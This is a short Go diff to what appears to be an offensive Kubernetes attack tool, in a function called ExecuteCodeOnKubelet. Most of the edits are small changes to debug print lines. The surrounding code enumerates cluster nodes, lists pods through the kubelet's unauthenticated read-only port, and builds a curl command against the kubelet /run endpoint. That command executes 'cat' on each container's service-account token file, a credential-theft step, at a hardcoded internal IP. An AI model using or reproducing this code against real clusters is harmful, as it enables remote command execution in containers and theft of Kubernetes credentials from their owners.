@@ -1546,12 +1546,12 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 		}
 		//adam here
 		for _, item := range getnodeDetail.Items {
-			// fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
+
 			for _, addr := range item.Status.Addresses {
-				//fmt.Println(" found for pod " + item.Metadata.Name + " - " + addr.Address)
+				fmt.Println(" found IP for node " + item.Metadata.Name + " - " + addr.Address)
 				if addr.Type == "Hostname" {
 				} else {
-					fmt.Println("[+] Kubelet List Pod URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
+					fmt.Println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
 					fmt.Println("[+] Grabbing Pods from node: " + item.Metadata.Name)
 					client := &http.Client{}
 					// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
@@ -1582,6 +1582,7 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo) {
 									PodNamespace:  podNamespace,
 									ContainerName: containerName,
 								})
+								// Work is here.
 								cmdline := "curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
 								println(cmdline)
 							}
